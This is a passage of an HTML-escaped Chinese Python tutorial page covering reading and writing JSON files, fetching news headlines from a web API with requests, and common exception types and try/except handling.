&lt;&#x2F;span&gt;&lt;span&gt;		fs2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(data) &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;程序执行结束&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;注意：文件的路径&lt;&#x2F;p&gt;
&lt;p&gt;读写JSON文件&lt;&#x2F;p&gt;
&lt;p&gt;JSON是纯文本（任何系统任何编程语言都可以处理纯文本）&lt;&#x2F;p&gt;
&lt;p&gt;JSON可以作为异构系统之间交换数据的标准&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;clip_image002-1598008411690.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;我们使用Python中的json模块就可以将字典或列表以json格式保存到文件中&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;json&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    mydict={&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;拼客学院&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;qq&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;123456789&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;chengyuan&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaohong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;],&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;kecheng&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:[&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            {&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;fenlei&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;shentouceshi&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;tedian&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;heike&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;},&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            {&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;fenlei&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xitongyunwei&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;tedian&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;yunwei&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        ]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;data.json&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;w&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dump&lt;&#x2F;span&gt;&lt;span&gt;(mydict,f)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;数据保存完成！&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;JSON模块中四个比较重要的函数:&lt;&#x2F;p&gt;
&lt;p&gt;dump-将python对象按照json格式序列化到文件中&lt;&#x2F;p&gt;
&lt;p&gt;dumps-将python对象处理成json格式的字符串&lt;&#x2F;p&gt;
&lt;p&gt;load-将文件中的json数据反序列化成对象&lt;&#x2F;p&gt;
&lt;p&gt;loads-将字符串的内容反序列化成Python对象&lt;&#x2F;p&gt;
&lt;p&gt;目前绝大多数网络数据服务（网络API）都是基于http协议提供json格式的数据&lt;&#x2F;p&gt;
&lt;p&gt;下面这个例子通过requests模块访问网络API获取国内新闻
天行数据&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;json &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	resp=requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;api.tianapi.com&#x2F;guonei&#x2F;index?key= xx &amp;amp;num=10&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	data_model=json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(resp.text)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;news &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;data_model[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;newslist&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(news[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;JSON序列化优势&lt;&#x2F;p&gt;
&lt;p&gt;如果我们要在不同的编程语言之间传递对象，就必须把对象序列化为标准格式，比如XML&lt;&#x2F;p&gt;
&lt;p&gt;但更好的方法是序列化为JSON，因为JSON表示出来就是一个字符串，可以被所有语言读取，也可以方便的存储到磁盘或者通过网络传输&lt;&#x2F;p&gt;
&lt;p&gt;JSON不仅是标准格式，并且XML更快，而且可以直接在web页面读取，非常方便&lt;&#x2F;p&gt;
&lt;p&gt;很多HTTP接口都采用json来传输数据&lt;&#x2F;p&gt;
&lt;p&gt;Python的异常处理&lt;&#x2F;p&gt;
&lt;p&gt;什么是异常？&lt;&#x2F;p&gt;
&lt;p&gt;程序在运行过程中会出现各种各样的问题，例如语法编写错误或者文件读写错误等。&lt;&#x2F;p&gt;
&lt;p&gt;默认情况下，出现错误的时候程序后马上停止执行，并根据错误情况反馈异常，这样就可以方便程序员进行排错和调试。&lt;&#x2F;p&gt;
&lt;p&gt;本质上讲，异常是一种类，并且有很多子类，基类为BaseException&lt;&#x2F;p&gt;
&lt;p&gt;常见的异常类型&lt;&#x2F;p&gt;
&lt;p&gt;IOError&#x2F;FileNotFoundError&lt;&#x2F;p&gt;
&lt;p&gt;输入输出异常&#x2F;文件未找到异常&lt;&#x2F;p&gt;
&lt;p&gt;Python2中是IO，Python3中是FileNotFound&lt;&#x2F;p&gt;
&lt;p&gt;异常代码：file1=open(&#x27;filetest.txt&#x27;,&#x27;r&#x27;)&lt;&#x2F;p&gt;
&lt;p&gt;ZeroDivisionError：分母为零的异常&lt;&#x2F;p&gt;
&lt;p&gt;异常代码：  a=1&lt;&#x2F;p&gt;
&lt;p&gt;​					 b=0&lt;&#x2F;p&gt;
&lt;p&gt;​					 print(a&#x2F;b)&lt;&#x2F;p&gt;
&lt;p&gt;TypeError：类型错误，操作对本类型无效&lt;&#x2F;p&gt;
&lt;p&gt;异常代码：a=1&lt;&#x2F;p&gt;
&lt;p&gt;​                   b=&#x27;hello&#x27;&lt;&#x2F;p&gt;
&lt;p&gt;​                   print(a+b)&lt;&#x2F;p&gt;
&lt;p&gt;ValueError：值异常，或者叫参数异常&lt;&#x2F;p&gt;
&lt;p&gt;异常代码：num=int(&#x27;a&#x27;)&lt;&#x2F;p&gt;
&lt;p&gt;​                   print(num)&lt;&#x2F;p&gt;
&lt;p&gt;SyntexError：语法错误&lt;&#x2F;p&gt;
&lt;p&gt;异常代码：a=1+&lt;&#x2F;p&gt;
&lt;p&gt;NameError：名字异常，对象未定义&lt;&#x2F;p&gt;
&lt;p&gt;异常代码：a=1&lt;&#x2F;p&gt;
&lt;p&gt;​                   print(a+b)&lt;&#x2F;p&gt;
&lt;p&gt;ArributeError：属性异常，对象没有此属性或者方法&lt;&#x2F;p&gt;
&lt;p&gt;异常代码：a=&#x27;hello&#x27;&lt;&#x2F;p&gt;
&lt;p&gt;​                   b=a.coun()&lt;&#x2F;p&gt;
&lt;p&gt;​                   print(b)&lt;&#x2F;p&gt;
&lt;p&gt;异常处理&lt;&#x2F;p&gt;
&lt;p&gt;异常错误会导致程序终止运行，我们可以对异常进行捕获，进行进一步操作&lt;&#x2F;p&gt;
&lt;p&gt;异常处理分为异常捕获，异常清理，异常触发&lt;&#x2F;p&gt;
&lt;p&gt;功能：可以提高程序的健壮性，实现程序的友好度，实现程序的功能调试&lt;&#x2F;p&gt;
&lt;p&gt;异常捕获&lt;&#x2F;p&gt;
&lt;p&gt;try…except…&lt;&#x2F;p&gt;
&lt;p&gt;功能：执行try语句，若没有异常，则正常执行，忽略except代码块；若出现异常，跳过try语句，执行except代码块&lt;&#x2F;p&gt;
&lt;p&gt;捕获一个异常&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    b=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a+b)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;TypeError:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;invalid type,please try again&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;捕获多个异常，同一个处理结果&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    s=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;how old are you：&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(s)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a+s)   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#代码逻辑有问题，仅用于触发异常&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;(TypeError,ValueError):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;enter an integer value,please try again!&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;捕获多个异常，不同的处理结果&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    s=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;how old are you：&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(s)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a+s)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;TypeError:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;enter an integer value&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;ValueError:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;please try again!&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;捕获所有异常&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    s=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;how old are you：&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# print(s)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# print(a+s)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a&#x2F;s)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except&lt;&#x2F;span&gt;&lt;span&gt;:  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#捕获所有异常，except这里不需要写特定类型异常即可&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;enter an integer value&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;正常情况下，只执行一次try语句，当出现异常的时候，重复执行代码块：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;get_age&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            n=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;How old are you:&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;please try again!&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
